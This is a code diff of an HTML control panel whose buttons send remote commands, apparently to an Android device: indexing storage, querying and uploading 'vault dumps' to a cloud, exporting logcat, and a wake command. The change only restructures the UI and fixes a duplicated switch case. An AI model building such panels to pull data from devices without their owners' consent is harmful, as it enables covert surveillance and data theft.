@@ -283,10 +283,9 @@
                     </div>
                 </div>
                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Vault Integrity</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><div style="flex:1; display:flex; gap:5px;"><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Check Size</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Dumps</button></div></div></div>
-                <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
-                    <button class="btn" onclick="sendCmd('GET_LOGS')">Diag Logs</button>
-                </div>
+                <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
             </div>
 
             <h2>Maintenance</h2>
@@ -482,8 +481,8 @@
                     case 'GET_SKELETON':
                         content = document.getElementById('val-skeleton').value || '5'; break;
                     case 'GET_VAULT_SIZE':
-                        content = ''; break;
-                    case 'GET_VAULT_SIZE':
+                    case 'UPLOAD_DUMPS':
+                    case 'GET_LOGS':
                         content = ''; break;
                     case 'WAKE':
                         content = document.getElementById('val-wake').value; break;
